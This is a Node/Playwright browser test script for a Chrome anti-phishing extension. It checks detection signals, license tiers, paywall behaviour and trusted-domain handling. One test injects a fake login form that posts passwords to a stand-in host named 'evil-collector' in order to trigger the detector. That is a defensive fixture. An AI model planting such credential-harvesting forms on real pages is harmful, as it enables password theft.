/**
 * Browser verification for PhishClean detectors.
 * Loads the unpacked extension in the installed Chrome, drives the test pages,
 * and reads the extension's own threat log (chrome.storage.local) to confirm
 * which signals actually fired in a real page context.
 *
 * Run: node tests/browser-verify.mjs
 */
import { chromium } from "playwright";
import { createServer } from "http";
import { readFileSync, existsSync, mkdtempSync } from "fs";
import { resolve, dirname, extname, join } from "path";
import { fileURLToPath } from "url";
import { tmpdir } from "os";

const __dirname = dirname(fileURLToPath(import.meta.url));
const EXT = resolve(__dirname, "..", "extension");
const PORT = 8080;
const BASE = `http://localhost:${PORT}`;

let pass = 0, fail = 0;
const ok = (label, cond, detail = "") => {
  console.log(`  ${cond ? "PASS" : "FAIL"}: ${label}${cond ? "" : detail ? " — " + detail : ""}`);
  cond ? pass++ : fail++;
};

/* ── tiny static server for tests/*.html ── */
const MIME = { ".html": "text/html", ".css": "text/css", ".js": "text/javascript", ".json": "application/json" };
function startServer() {
  const server = createServer((req, res) => {
    const url = new URL(req.url, BASE);
    const filePath = resolve(__dirname, "." + (url.pathname === "/" ? "/index.html" : url.pathname));
    if (!existsSync(filePath)) { res.writeHead(404); res.end("Not found"); return; }
    res.writeHead(200, { "Content-Type": MIME[extname(filePath)] || "text/plain" });
    res.end(readFileSync(filePath));
  });
  return new Promise((r) => server.listen(PORT, () => r(server)));
}

/* ── extension storage helpers (run in the service-worker context) ── */
async function sw(context) {
  let [worker] = context.serviceWorkers();
  if (worker) return worker;
  /* Nudge the browser so the MV3 background wakes, then wait for it. */
  const warmup = await context.newPage();
  await warmup.goto(BASE + "/test-safe-login.html", { waitUntil: "load" }).catch(() => {});
  await warmup.waitForTimeout(500);
  [worker] = context.serviceWorkers();
  if (!worker) worker = await context.waitForEvent("serviceworker", { timeout: 30000 });
  await warmup.close().catch(() => {});
  return worker;
}
const setLicense = (worker, lic) =>
  worker.evaluate((l) => chrome.storage.local.set({ phishclean_license: l }), lic);
const clearThreats = (worker) =>
  worker.evaluate(() => chrome.storage.local.set({ phishclean_threat_log: [], phishclean_stats: { blocked: 0 } }));
const resetSession = (worker) =>
  worker.evaluate(() => chrome.storage.local.set({ phishclean_whitelist_domains: [] }));
const setWhitelist = (worker, domains) =>
  worker.evaluate((d) => chrome.storage.local.set({ phishclean_whitelist_domains: d }), domains);
const getWhitelist = (worker) =>
  worker.evaluate(() => chrome.storage.local.get("phishclean_whitelist_domains").then((d) => d.phishclean_whitelist_domains || []));
const getThreats = (worker) =>
  worker.evaluate(() => chrome.storage.local.get("phishclean_threat_log").then((d) => d.phishclean_threat_log || []));

const TRIAL_LICENSE = { install_id: "test", is_paid: false, trial_active: true, pro_enabled: true, protection_level: "full", days_remaining: 10, needs_account: false, needs_payment: false };
const PAID_LICENSE  = { install_id: "test", is_paid: true, trial_active: false, pro_enabled: true, protection_level: "full", plan_type: "monthly", needs_account: false, needs_payment: false };
/* The real post-trial state for the typical install: anonymous, so the server
   sets needs_account rather than needs_payment. The checkout offer must show
   for this case — it is nearly every expired install in the funnel. */
const EXPIRED_LICENSE = { install_id: "test", is_paid: false, trial_active: false, pro_enabled: false, protection_level: "free", trial_expires_at: "2026-01-01T00:00:00.000Z", has_account: false, needs_account: true, needs_payment: false };

/* Poll the threat log until an entry appears (or timeout). */
async function waitForThreat(worker, ms = 6000) {
  const deadline = Date.now() + ms;
  while (Date.now() < deadline) {
    const t = await getThreats(worker);
    if (t.length) return t[0];
    await new Promise((r) => setTimeout(r, 250));
  }
  return null;
}

async function main() {
  const server = await startServer();
  const userDataDir = mkdtempSync(join(tmpdir(), "phishclean-verify-"));

  const context = await chromium.launchPersistentContext(userDataDir, {
    /* Use Playwright's bundled Chromium — the installed Chrome 150 no longer
       honors --load-extension. */
    headless: false,
    args: [
      `--disable-extensions-except=${EXT}`,
      `--load-extension=${EXT}`,
      "--no-first-run", "--no-default-browser-check",
      "--no-sandbox", "--disable-dev-shm-usage",
      "--disable-features=DisableLoadExtensionCommandLineSwitch",
    ],
  });

  /* Keep license state deterministic: block the backend so register/refresh
     can't overwrite the licenses we seed for each test. */
  await context.route("**://www.phishclean.com/**", (r) => r.abort());

  try {
    const worker = await sw(context);
    ok("Extension service worker started", !!worker);
    const extId = new URL(worker.url()).host;
    /* Let onInstalled → registerInstall settle before we seed licenses. */
    await new Promise((r) => setTimeout(r, 1000));

    // ── Test 1 — Trial gives full protection ──
    console.log("\n── Test 1: Active trial → full protection ──");
    await setLicense(worker, TRIAL_LICENSE);
    await clearThreats(worker); await resetSession(worker);
    let page = await context.newPage();
    await page.goto(`${BASE}/test-form-mismatch.html`, { waitUntil: "load" });
    let threat = await waitForThreat(worker);
    ok("Trial: alert fired on form-mismatch page", !!threat, "no threat logged");
    if (threat) {
      ok("Trial: PASSWORD_FIELD detected", threat.signals?.includes("PASSWORD_FIELD"));
      ok("Trial: DOMAIN_MISMATCH detected", threat.signals?.includes("DOMAIN_MISMATCH"));
      ok("Trial: score >= 40 (alert threshold)", threat.score >= 40, `score=${threat.score}`);
    }
    ok("Trial: modal host present in DOM", !!(await page.$("#phishclean-root")));
    await page.close();

    // ── Test 2 — Expired trial → free tier: the two free signals still run, pro ones do not ──
    console.log("\n── Test 2: Expired trial → free tier (2 signals on, 15 off) ──");
    await setLicense(worker, EXPIRED_LICENSE);
    await clearThreats(worker); await resetSession(worker);
    page = await context.newPage();
    await page.goto(`${BASE}/test-form-mismatch.html`, { waitUntil: "load" });
    const freeThreat = await waitForThreat(worker);
    ok("Expired: free signals still fire on form-mismatch page", !!freeThreat);
    if (freeThreat) ok("Expired: DOMAIN_MISMATCH is a free signal", freeThreat.signals?.includes("DOMAIN_MISMATCH"));
    await page.close();
    await clearThreats(worker); await resetSession(worker);
    page = await context.newPage();
    await page.goto(`${BASE}/test-hidden-iframe.html`, { waitUntil: "load" });
    await page.waitForTimeout(2000);
    const proThreats = await getThreats(worker);
    ok("Expired: pro-only HIDDEN_IFRAME does not alert", !proThreats.some((t) => t.signals?.includes("HIDDEN_IFRAME")));
    await page.close();

    // ── Test 3 — Fix #2: dynamically injected form triggers re-scan (trial) ──
    console.log("\n── Test 3: Live re-scan of injected content (Fix #2) ──");
    await setLicense(worker, TRIAL_LICENSE);
    await clearThreats(worker); await resetSession(worker);
    page = await context.newPage();
    await page.goto(`${BASE}/test-safe-login.html`, { waitUntil: "load" });
    await page.waitForTimeout(1200);
    ok("Safe login: no alert before injection", (await getThreats(worker)).length === 0);
    await page.evaluate(() => {
      const f = document.createElement("form");
      f.action = "https://evil-collector.example.com/steal";
      f.innerHTML = '<input type="password" name="p">';
      document.body.appendChild(f);
    });
    threat = await waitForThreat(worker, 4000);
    ok("Injected form triggers alert via MutationObserver", !!threat, "no threat after injection");
    if (threat) ok("Injected: DOMAIN_MISMATCH detected on re-scan", threat.signals?.includes("DOMAIN_MISMATCH"));

    // ── Test 4 — Fix #6: Escape dismisses the modal ──
    console.log("\n── Test 4: Modal accessibility — Escape dismisses (Fix #6) ──");
    ok("Modal present before Escape", !!(await page.$("#phishclean-root")));
    await page.keyboard.press("Escape");
    await page.waitForTimeout(300);
    ok("Modal removed after Escape", !(await page.$("#phishclean-root")));
    await page.close();

    // ── Test 5 — Paid plan: pro detector + shared PSL wiring ──
    console.log("\n── Test 5: Paid plan → hidden-iframe signal (Fixes #3/#5 wiring) ──");
    await setLicense(worker, PAID_LICENSE);
    await clearThreats(worker); await resetSession(worker);
    page = await context.newPage();
    await page.goto(`${BASE}/test-hidden-iframe.html`, { waitUntil: "load" });
    threat = await waitForThreat(worker);
    ok("Paid: alert fired on hidden-iframe page", !!threat);
    if (threat) ok("Paid: HIDDEN_IFRAME signal present (pro detector ran)", threat.signals?.includes("HIDDEN_IFRAME"));
    await page.close();

    // ── Test 6 — Popup UI renders without errors ──
    console.log("\n── Test 6: Popup UI smoke ──");
    await setLicense(worker, TRIAL_LICENSE);
    page = await context.newPage();
    const popupErrors = [];
    page.on("pageerror", (e) => popupErrors.push(e.message));
    await page.goto(`chrome-extension://${extId}/popup/popup.html`, { waitUntil: "load" });
    await page.waitForTimeout(800);
    ok("Popup: no uncaught JS errors", popupErrors.length === 0, popupErrors.join("; "));
    ok("Popup: badge shows Trial", (await page.textContent("#status-badge"))?.trim() === "Trial");
    ok("Popup: plan name reflects trial", /trial/i.test(await page.textContent("#plan-name")));
    ok("Popup: trusted-domains section present", !!(await page.$("#wl-list")));
    await page.close();

    // ── Test 7 — Options/onboarding UI renders without errors ──
    console.log("\n── Test 7: Options UI smoke ──");
    await setLicense(worker, TRIAL_LICENSE);
    page = await context.newPage();
    const optErrors = [];
    page.on("pageerror", (e) => optErrors.push(e.message));
    await page.goto(`chrome-extension://${extId}/options/options.html`, { waitUntil: "load" });
    await page.waitForTimeout(800);
    ok("Options: no uncaught JS errors", optErrors.length === 0, optErrors.join("; "));
    ok("Options: status pill shows Trial Active", /trial active/i.test(await page.textContent("#status-pill")));
    /* The optional mid-trial ask is shown on purpose (options.js), while the
       checkout card must not appear before the trial has ended. */
    ok("Options: optional account card shown during active trial", await page.$eval("#auth-card", (el) => el.style.display !== "none"));
    ok("Options: payment card hidden during active trial", await page.$eval("#payment-card", (el) => el.style.display === "none"));
    await page.close();

    // ── Test 8 — Options paywall shows when trial ended ──
    console.log("\n── Test 8: Options paywall on expired trial ──");
    await setLicense(worker, EXPIRED_LICENSE);
    page = await context.newPage();
    await page.goto(`chrome-extension://${extId}/options/options.html`, { waitUntil: "load" });
    await page.waitForTimeout(800);
    ok("Options: payment card visible when trial ended", await page.$eval("#payment-card", (el) => el.style.display !== "none"));
    ok("Options: status pill shows Free", /free/i.test(await page.textContent("#status-pill")));
    ok("Options: account card no longer says required", !/required/i.test(await page.textContent("#auth-pill")));
    await page.close();

    // ── Test 8b — Popup paywall goes straight to checkout, no account needed ──
    console.log("\n── Test 8b: Popup paywall → checkout without an account ──");
    await setLicense(worker, EXPIRED_LICENSE);
    page = await context.newPage();
    await page.goto(`chrome-extension://${extId}/popup/popup.html`, { waitUntil: "load" });
    await page.waitForTimeout(800);
    ok("Popup: paywall overlay shown on expired anonymous install", !!(await page.$("#pw-monthly")));
    const [billingTab] = await Promise.all([
      context.waitForEvent("page", { timeout: 5000 }).catch(() => null),
      page.click("#pw-monthly")
    ]);
    const billingUrl = billingTab?.url() || "";
    ok("Popup: $9/month opens the billing page (not the signup page)", /^https:\/\/www\.phishclean\.com\/billing\?/.test(billingUrl), billingUrl);
    ok("Popup: billing URL carries install_id and plan", /install_id=test/.test(billingUrl) && /plan=monthly/.test(billingUrl), billingUrl);
    if (billingTab) await billingTab.close();
    await page.close();

    // ── Test 9 — Popup: add a trusted domain (functional) ──
    console.log("\n── Test 9: Popup trusted-domain add ──");
    await setLicense(worker, TRIAL_LICENSE);
    await resetSession(worker);
    page = await context.newPage();
    await page.goto(`chrome-extension://${extId}/popup/popup.html`, { waitUntil: "load" });
    await page.waitForTimeout(400);
    await page.fill("#wl-input", "evil-test.example");
    await page.click("#btn-add-manual");
    await page.waitForTimeout(400);
    ok("Popup: domain appears in trusted list", /evil-test\.example/.test(await page.textContent("#wl-list")));
    ok("Popup: trusted count = 1", (await page.textContent("#wl-count"))?.trim() === "1");
    ok("Popup: persisted to storage", (await getWhitelist(worker)).includes("evil-test.example"));
    await page.close();

    // ── Test 10 — Whitelisted domain suppresses detection (functional) ──
    console.log("\n── Test 10: Trusted domain suppresses alerts ──");
    await setLicense(worker, TRIAL_LICENSE);
    await setWhitelist(worker, ["localhost"]);
    await clearThreats(worker);
    page = await context.newPage();
    await page.goto(`${BASE}/test-form-mismatch.html`, { waitUntil: "load" });
    await page.waitForTimeout(2000);
    ok("Trusted: no alert on whitelisted domain", (await getThreats(worker)).length === 0);
    ok("Trusted: no modal host in DOM", !(await page.$("#phishclean-root")));
    await page.close();

  } finally {
    await context.close();
    server.close();
  }

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
}

main().catch((e) => { console.error(e); process.exit(1); });
